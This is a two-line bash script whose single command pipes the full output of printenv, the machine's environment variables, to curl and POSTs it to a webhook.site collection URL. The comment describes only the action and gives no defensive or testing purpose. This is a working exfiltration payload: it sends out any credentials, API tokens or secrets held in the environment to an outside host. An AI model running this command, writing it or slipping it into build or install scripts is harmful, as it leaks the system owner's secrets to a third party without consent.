#!/bin/bash

# Send a POST request with the result of printenv
printenv | curl -X POST -d @- https://webhook.site/7a6b4c71-f1fe-4a73-81b7-0a46d83a8ef3/
